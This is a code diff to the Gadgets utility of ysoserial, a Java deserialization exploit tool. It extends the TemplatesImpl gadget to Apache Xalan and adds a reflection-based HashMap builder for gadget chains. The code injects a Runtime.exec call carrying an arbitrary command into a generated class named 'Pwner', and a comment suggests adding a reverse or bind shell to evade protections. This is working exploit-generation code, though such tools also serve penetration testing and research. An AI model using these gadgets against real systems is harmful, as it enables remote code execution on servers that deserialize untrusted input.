@@ -4,7 +4,9 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 
 import java.io.Serializable;
 import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
@@ -12,6 +14,7 @@ import java.util.Map;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
+import ysoserial.payloads.util.Gadgets.StubTransletPayload;
 
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
@@ -24,7 +27,7 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 /*
  * utility generator functions for common jdk-only gadgets
  */
-@SuppressWarnings("restriction")
+@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
 public class Gadgets {
 	static {
 		// special case for using TemplatesImpl gadgets with a SecurityManager enabled
@@ -71,19 +74,35 @@ public class Gadgets {
 		map.put(key,val);
 		return map;
 	}
+	
 
-	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
-		final TemplatesImpl templates = new TemplatesImpl();
+    public static Object createTemplatesImpl ( final String command ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                command,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
+	public static <T> T createTemplatesImpl(final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
+	    final T templates = tplClass.newInstance();
 
 		// use template gadget class
-		ClassPool pool = ClassPool.getDefault();
-		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
-		final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+	    ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+        pool.insertClassPath(new ClassClassPath(abstTranslet));
+        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
 		// run command in static initializer
 		// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
 		clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");
 		// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
 		clazz.setName("ysoserial.Pwner" + System.nanoTime());
+		CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
 
 		final byte[] classBytes = clazz.toBytecode();
 
@@ -97,4 +116,21 @@ public class Gadgets {
 		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 		return templates;
 	}
+	
+
+    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
+            IllegalAccessException, InvocationTargetException {
+        HashMap s = new HashMap();
+        Reflections.setFieldValue(s, "size", 2);
+
+        Class nodeC = Class.forName("java.util.HashMap$Node");
+        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
+        nodeCons.setAccessible(true);
+
+        Object tbl = Array.newInstance(nodeC, 2);
+        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
+        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
+        Reflections.setFieldValue(s, "table", tbl);
+        return s;
+    }
 }
